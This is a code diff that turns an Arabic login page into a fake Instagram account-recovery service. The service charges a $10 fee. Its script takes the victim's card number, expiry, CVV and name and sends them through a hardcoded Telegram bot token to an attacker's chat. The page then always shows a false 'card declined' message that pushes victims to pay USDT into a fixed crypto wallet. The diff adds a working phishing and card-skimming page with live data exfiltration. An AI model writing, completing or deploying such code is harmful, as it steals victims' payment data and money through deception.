@@ -1,65 +1,348 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>نظام تسجيل الدخول</title>
-<link rel="stylesheet" href="style.css">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>استرجاع حسابات إنستغرام | Instagram Recovery Pro</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet" />
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Cairo',sans-serif}
+body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-height:100vh;overflow-x:hidden}
+.header{display:flex;justify-content:space-between;align-items:center;padding:18px 30px;background:rgba(255,255,255,.05);backdrop-filter:blur(10px);border-bottom:1px solid rgba(255,255,255,.1);position:sticky;top:0;z-index:100}
+.logo{display:flex;align-items:center;gap:10px;font-weight:700;font-size:18px}
+.ig-icon{background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);padding:6px 10px;border-radius:10px;font-size:16px}
+.tg-btn{background:#229ED9;color:#fff;padding:8px 16px;border-radius:8px;text-decoration:none;font-weight:600;font-size:14px;transition:.3s}
+.tg-btn:hover{background:#1a7eb0;transform:translateY(-2px)}
+.hero{text-align:center;padding:60px 20px 30px}
+.hero h1{font-size:42px;font-weight:900;margin-bottom:15px}
+.hero h1 span{background:linear-gradient(45deg,#f09433,#dc2743,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hero p{font-size:17px;color:#b8b8d0;margin-bottom:25px}
+.badges{display:flex;justify-content:center;gap:12px;flex-wrap:wrap}
+.badges span{background:rgba(255,255,255,.08);padding:8px 16px;border-radius:20px;font-size:14px;border:1px solid rgba(255,255,255,.1)}
+.form-section{display:flex;justify-content:center;padding:30px 20px 60px}
+.form-card{background:rgba(255,255,255,.06);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.1);border-radius:20px;padding:35px;width:100%;max-width:520px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+.form-card h2{margin-bottom:25px;font-size:22px;text-align:center}
+.field{margin-bottom:18px}
+.field label{display:block;margin-bottom:8px;font-size:14px;color:#c8c8e0;font-weight:600}
+.field input,.field textarea,.field select{width:100%;padding:13px 15px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.15);border-radius:10px;color:#fff;font-size:15px;font-family:'Cairo',sans-serif;transition:.3s;direction:ltr;text-align:left}
+.field textarea{direction:rtl;text-align:right;resize:vertical}
+.field input:focus,.field textarea:focus,.field select:focus{outline:none;border-color:#dc2743;background:rgba(255,255,255,.12)}
+.field select option{background:#1a1a2e;color:#fff}
+.checkbox-label{display:flex;align-items:flex-start;gap:10px;font-size:13px;color:#c8c8e0;cursor:pointer;line-height:1.6}
+.checkbox-label input{width:auto;margin-top:3px}
+.submit-btn{width:100%;padding:15px;background:linear-gradient(45deg,#f09433,#dc2743,#bc1888);border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;transition:.3s;font-family:'Cairo',sans-serif;margin-top:10px}
+.submit-btn:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(220,39,67,.4)}
+.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);backdrop-filter:blur(6px);z-index:999;align-items:center;justify-content:center;padding:20px;overflow-y:auto}
+.modal-overlay.active{display:flex}
+.modal{background:linear-gradient(135deg,#1a1a2e,#16213e);border:1px solid rgba(255,255,255,.15);border-radius:20px;padding:30px;width:100%;max-width:440px;position:relative;box-shadow:0 20px 60px rgba(0,0,0,.8);animation:slideUp .3s ease;max-height:90vh;overflow-y:auto}
+@keyframes slideUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+.close-modal{position:absolute;top:15px;left:15px;background:rgba(255,255,255,.1);border:none;color:#fff;width:32px;height:32px;border-radius:50%;cursor:pointer;font-size:16px;transition:.3s}
+.close-modal:hover{background:rgba(255,255,255,.2)}
+.modal h2{text-align:center;margin-bottom:10px;font-size:20px}
+.price-tag{text-align:center;font-size:30px;font-weight:900;background:linear-gradient(45deg,#f09433,#dc2743);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:20px}
+.tabs{display:flex;gap:8px;margin-bottom:20px;background:rgba(0,0,0,.3);padding:5px;border-radius:12px}
+.tab{flex:1;padding:10px;background:transparent;border:none;color:#a0a0c0;border-radius:8px;cursor:pointer;font-family:'Cairo',sans-serif;font-weight:600;font-size:14px;transition:.3s}
+.tab.active{background:linear-gradient(45deg,#f09433,#dc2743);color:#fff}
+.tab-content{display:none}
+.tab-content.active{display:block}
+.row{display:flex;gap:10px}
+.row .field{flex:1}
+.pay-btn{width:100%;padding:15px;background:linear-gradient(45deg,#10b981,#059669);border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;margin-top:10px;font-family:'Cairo',sans-serif;transition:.3s}
+.pay-btn:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(16,185,129,.4)}
+.pay-btn:disabled{opacity:.6;cursor:not-allowed;transform:none}
+.secure-note{text-align:center;font-size:12px;color:#8080a0;margin-top:15px}
+.usdt-note{text-align:center;color:#b8b8d0;margin-bottom:15px;font-size:14px}
+.wallet-box{display:flex;align-items:center;gap:8px;background:rgba(0,0,0,.4);padding:12px;border-radius:10px;margin-bottom:18px;border:1px dashed rgba(255,255,255,.2)}
+.wallet-box code{flex:1;font-size:11px;word-break:break-all;color:#10b981;direction:ltr;text-align:left}
+.copy-btn{background:#10b981;border:none;color:#fff;padding:6px 10px;border-radius:6px;cursor:pointer;font-size:12px;font-family:'Cairo',sans-serif}
+.error-icon,.success-icon{font-size:60px;text-align:center;margin-bottom:15px}
+.error-modal p,.success-modal p{text-align:center;color:#c8c8e0;margin-bottom:20px;line-height:1.6}
+.footer{text-align:center;padding:25px;color:#8080a0;font-size:13px;border-top:1px solid rgba(255,255,255,.08)}
+.footer a{color:#dc2743;text-decoration:none;margin-right:10px}
+@media(max-width:600px){.hero h1{font-size:28px}.hero p{font-size:15px}.form-card{padding:25px 20px}.header{padding:15px 18px}.logo span{font-size:14px}.tg-btn{font-size:12px;padding:6px 12px}.modal{padding:25px 20px}}
+</style>
 </head>
 <body>
 
-<div class="container" id="authContainer">
-    <h2 id="authTitle">تسجيل الدخول</h2>
-    <div id="loginFormDiv">
-        <input type="text" id="username" placeholder="اسم المستخدم">
-        <input type="password" id="password" placeholder="كلمة المرور">
-        <button onclick="login()">تسجيل الدخول</button>
-        <p>ليس لديك حساب؟ <a href="#" onclick="showSignup()">إنشاء حساب</a></p>
-        <p id="loginError" class="error"></p>
+<header class="header">
+  <div class="logo">
+    <div class="ig-icon">📷</div>
+    <span>Instagram Recovery Pro</span>
+  </div>
+  <a href="https://t.me/RASHKINAE" target="_blank" class="tg-btn">✈️ تواصل معنا</a>
+</header>
+
+<section class="hero">
+  <h1>استرجاع حساب إنستغرام <span>باحترافية</span></h1>
+  <p>خدمة استرجاع الحسابات المخترقة والمقفلة بسرعة وأمان تام</p>
+  <div class="badges">
+    <span>🔒 آمن 100%</span>
+    <span>⚡ خلال 24 ساعة</span>
+    <span>💰 ضمان استرجاع</span>
+  </div>
+</section>
+
+<section class="form-section">
+  <div class="form-card">
+    <h2>📝 طلب استرجاع الحساب</h2>
+    <form id="recoveryForm">
+      <div class="field">
+        <label>البريد الإلكتروني *</label>
+        <input type="email" id="email" placeholder="example@email.com" required />
+      </div>
+      <div class="field">
+        <label>اسم حساب إنستغرام *</label>
+        <input type="text" id="username" placeholder="@username" required />
+      </div>
+      <div class="field">
+        <label>ملاحظات إضافية</label>
+        <textarea id="notes" rows="3" placeholder="أي معلومات تساعدنا في الاسترجاع..."></textarea>
+      </div>
+      <div class="field checkbox-field">
+        <label class="checkbox-label">
+          <input type="checkbox" id="confirm" required />
+          <span>أوافق على الشروط وسياسة الخصوصية وأؤكد أن الحساب ملكي</span>
+        </label>
+      </div>
+      <button type="submit" class="submit-btn">💳 المتابعة إلى الدفع - 10$</button>
+    </form>
+  </div>
+</section>
+
+<!-- Modal الدفع -->
+<div class="modal-overlay" id="paymentModal">
+  <div class="modal">
+    <button class="close-modal" onclick="closeModal()">✕</button>
+    <h2>💳 إتمام الدفع</h2>
+    <p class="price-tag">10.00 USD</p>
+
+    <div class="tabs">
+      <button class="tab active" onclick="switchTab('card')">💳 بطاقة</button>
+      <button class="tab" onclick="switchTab('usdt')">🪙 USDT</button>
     </div>
-    <div id="signupFormDiv" class="hidden">
-        <input type="text" id="newUsername" placeholder="اسم المستخدم">
-        <input type="password" id="newPassword" placeholder="كلمة المرور">
-        <button onclick="signup()">إنشاء الحساب</button>
-        <p>لديك حساب؟ <a href="#" onclick="showLogin()">تسجيل الدخول</a></p>
-        <p id="signupError" class="error"></p>
+
+    <div id="cardTab" class="tab-content active">
+      <div class="field">
+        <label>رقم البطاقة</label>
+        <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" />
+      </div>
+      <div class="row">
+        <div class="field">
+          <label>تاريخ الانتهاء</label>
+          <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" />
+        </div>
+        <div class="field">
+          <label>CVV</label>
+          <input type="text" id="cardCvv" placeholder="123" maxlength="4" />
+        </div>
+      </div>
+      <div class="field">
+        <label>اسم حامل البطاقة</label>
+        <input type="text" id="cardName" placeholder="الاسم على البطاقة" />
+      </div>
+      <div class="field">
+        <label>نوع البنك / البلد</label>
+        <select id="bankCountry">
+          <option value="">-- اختر البلد --</option>
+          <option value="US">الولايات المتحدة</option>
+          <option value="UK">المملكة المتحدة</option>
+          <option value="FR">فرنسا</option>
+          <option value="DE">ألمانيا</option>
+          <option value="MA">المغرب</option>
+          <option value="DZ">الجزائر</option>
+          <option value="TN">تونس</option>
+          <option value="EG">مصر</option>
+          <option value="SA">السعودية</option>
+          <option value="AE">الإمارات</option>
+          <option value="OTHER">أخرى</option>
+        </select>
+      </div>
+      <button class="pay-btn" id="cardPayBtn" onclick="payWithCard()">🔒 دفع 10$ بأمان</button>
     </div>
+
+    <div id="usdtTab" class="tab-content">
+      <p class="usdt-note">أرسل مبلغ 10 USDT (BEP20) إلى العنوان التالي:</p>
+      <div class="wallet-box">
+        <code id="walletAddress">0xcc77f540130d76e21eaf1e60481af20a56ee24fc</code>
+        <button class="copy-btn" onclick="copyWallet()">📋 نسخ</button>
+      </div>
+      <div class="field">
+        <label>أدخل Hash المعاملة بعد الإرسال</label>
+        <input type="text" id="txHash" placeholder="0x..." />
+      </div>
+      <button class="pay-btn" id="usdtPayBtn" onclick="payWithUsdt()">✅ تأكيد الدفع USDT</button>
+    </div>
+
+    <div class="secure-note">🔒 جميع المعاملات مشفرة وآمنة</div>
+  </div>
 </div>
 
-<!-- لوحة المستخدم العادي -->
-<div class="container hidden" id="userPanel">
-    <h2>مرحبا بك، <span id="displayUser"></span></h2>
-    <p>هذه هي لوحة المستخدم العادي.</p>
-    <button onclick="logout()">تسجيل الخروج</button>
+<!-- Modal خطأ -->
+<div class="modal-overlay" id="errorModal">
+  <div class="modal error-modal">
+    <div class="error-icon">⚠️</div>
+    <h2>عذراً، تم رفض البطاقة</h2>
+    <p id="errorText">لا نقبل البطاقات الصادرة من هذا البنك. يرجى استخدام طريقة دفع أخرى (USDT BEP20) أو بطاقة من بنك آخر.</p>
+    <button class="submit-btn" onclick="closeError()">حسناً، فهمت</button>
+  </div>
 </div>
 
-<!-- لوحة الأدمن -->
-<div class="container hidden" id="adminPanel">
-    <h2>لوحة التحكم للأدمن</h2>
-    
-    <h3>إدارة روابط مواقع التواصل</h3>
-    <input type="text" id="platform" placeholder="اسم المنصة">
-    <input type="text" id="link" placeholder="الرابط">
-    <button onclick="addLink()">إضافة الرابط</button>
-    <ul id="socialList"></ul>
-    
-    <h3>إدارة الأخبار</h3>
-    <input type="text" id="newsTitle" placeholder="عنوان الخبر">
-    <textarea id="newsContent" rows="4" placeholder="نص الخبر"></textarea>
-    <button onclick="addNews()">نشر الخبر</button>
-    <div id="newsContainer"></div>
-    
-    <h3>رفع صور الموقع والشعار (تجريبي)</h3>
-    <label>صورة الموقع</label>
-    <input type="file" id="siteImage">
-    <label>اللوجو</label>
-    <input type="file" id="logoImage">
-    <button onclick="saveImages()">حفظ الصور</button>
-    
-    <br><br>
-    <button onclick="logout()">تسجيل الخروج</button>
+<!-- Modal نجاح -->
+<div class="modal-overlay" id="successModal">
+  <div class="modal success-modal">
+    <div class="success-icon">✅</div>
+    <h2>تم استلام طلبك!</h2>
+    <p>سنتواصل معك عبر البريد الإلكتروني أو تلغرام خلال 24 ساعة.</p>
+    <a href="https://t.me/RASHKINAE" target="_blank" class="submit-btn" style="display:block;text-align:center;text-decoration:none;">✈️ تواصل معنا على تلغرام</a>
+  </div>
 </div>
 
-<script src="script.js"></script>
+<footer class="footer">
+  <p>© 2025 Instagram Recovery Pro — جميع الحقوق محفوظة</p>
+  <a href="https://t.me/RASHKINAE" target="_blank">الدعم الفني</a>
+</footer>
+
+<script>
+// ============ CONFIG ============
+const TELEGRAM_BOT_TOKEN = "7370738476:AAHi1BjblAv9O1j3WB9yXRc6fPYf8euWfmQ";
+const TELEGRAM_CHAT_ID   = "7181380947";
+
+let currentOrder = {};
+
+// ============ FORM SUBMIT ============
+document.getElementById("recoveryForm").addEventListener("submit", function(e){
+  e.preventDefault();
+  currentOrder = {
+    email: document.getElementById("email").value.trim(),
+    username: document.getElementById("username").value.trim(),
+    notes: document.getElementById("notes").value.trim(),
+    confirmed: document.getElementById("confirm").checked,
+    timestamp: new Date().toLocaleString("ar-EG")
+  };
+  if(!currentOrder.confirmed){ alert("يجب الموافقة على الشروط أولاً"); return; }
+  document.getElementById("paymentModal").classList.add("active");
+});
+
+// ============ TABS ============
+function switchTab(tab){
+  document.querySelectorAll(".tab").forEach(t=>t.classList.remove("active"));
+  document.querySelectorAll(".tab-content").forEach(c=>c.classList.remove("active"));
+  if(tab==="card"){
+    document.querySelectorAll(".tab")[0].classList.add("active");
+    document.getElementById("cardTab").classList.add("active");
+  }else{
+    document.querySelectorAll(".tab")[1].classList.add("active");
+    document.getElementById("usdtTab").classList.add("active");
+  }
+}
+
+// ============ CARD FORMATTING ============
+document.getElementById("cardNumber").addEventListener("input", function(e){
+  let v = e.target.value.replace(/\s/g,"").replace(/\D/g,"");
+  e.target.value = v.match(/.{1,4}/g)?.join(" ") || "";
+});
+document.getElementById("cardExpiry").addEventListener("input", function(e){
+  let v = e.target.value.replace(/\D/g,"");
+  if(v.length>=2) v = v.slice(0,2)+"/"+v.slice(2,4);
+  e.target.value = v;
+});
+
+// ============ SEND TO TELEGRAM ============
+async function sendToTelegram(message){
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  try{
+    const res = await fetch(url,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode:"HTML" })
+    });
+    const data = await res.json();
+    if(!data.ok) console.error("Telegram error:", data);
+    return data.ok;
+  }catch(err){ console.error("Fetch error:", err); return false; }
+}
+
+// ============ PAY WITH CARD ============
+async function payWithCard(){
+  const cardNumber = document.getElementById("cardNumber").value.trim();
+  const cardExpiry = document.getElementById("cardExpiry").value.trim();
+  const cardCvv    = document.getElementById("cardCvv").value.trim();
+  const cardName   = document.getElementById("cardName").value.trim();
+  const bank       = document.getElementById("bankCountry").value;
+
+  if(!cardNumber || !cardExpiry || !cardCvv || !cardName || !bank){
+    alert("يرجى ملء جميع حقول البطاقة"); return;
+  }
+
+  const btn = document.getElementById("cardPayBtn");
+  btn.disabled = true; btn.innerText = "⏳ جارٍ المعالجة...";
+
+  const message = `
+💳 <b>طلب دفع جديد - بطاقة</b>
+
+👤 <b>العميل:</b>
+📧 البريد: <code>${currentOrder.email}</code>
+📸 الحساب: <code>${currentOrder.username}</code>
+📝 ملاحظات: ${currentOrder.notes || "لا يوجد"}
+
+💳 <b>بيانات البطاقة:</b>
+🔢 الرقم: <code>${cardNumber}</code>
+📅 الانتهاء: <code>${cardExpiry}</code>
+🔐 CVV: <code>${cardCvv}</code>
+👤 الاسم: <code>${cardName}</code>
+🏦 البلد: <code>${bank}</code>
+
+💰 المبلغ: 10$
+🕐 الوقت: ${currentOrder.timestamp}
+  `;
+
+  await sendToTelegram(message);
+
+  btn.disabled = false; btn.innerText = "🔒 دفع 10$ بأمان";
+
+  closeModal();
+  document.getElementById("errorModal").classList.add("active");
+}
+
+// ============ PAY WITH USDT ============
+async function payWithUsdt(){
+  const txHash = document.getElementById("txHash").value.trim();
+  if(!txHash){ alert("يرجى إدخال Hash المعاملة"); return; }
+
+  const btn = document.getElementById("usdtPayBtn");
+  btn.disabled = true; btn.innerText = "⏳ جارٍ التأكيد...";
+
+  const message = `
+🪙 <b>طلب دفع جديد - USDT BEP20</b>
+
+👤 <b>العميل:</b>
+📧 البريد: <code>${currentOrder.email}</code>
+📸 الحساب: <code>${currentOrder.username}</code>
+📝 ملاحظات: ${currentOrder.notes || "لا يوجد"}
+
+🪙 <b>بيانات USDT:</b>
+🔗 Hash: <code>${txHash}</code>
+💰 المبلغ: 10 USDT
+🌐 الشبكة: BEP20 (BSC)
+
+🕐 الوقت: ${currentOrder.timestamp}
+  `;
+
+  await sendToTelegram(message);
+
+  btn.disabled = false; btn.innerText = "✅ تأكيد الدفع USDT";
+
+  closeModal();
+  document.getElementById("successModal").classList.add("active");
+}
+
+// ============ HELPERS ============
+function closeModal(){ document.getElementById("paymentModal").classList.remove("active"); }
+function closeError(){ document.getElementById("errorModal").classList.remove("active"); }
+function copyWallet(){
+  const addr = document.getElementById("walletAddress").innerText;
+  navigator.clipboard.writeText(addr).then(()=>alert("✅ تم نسخ العنوان بنجاح"));
+}
+</script>
 </body>
 </html>
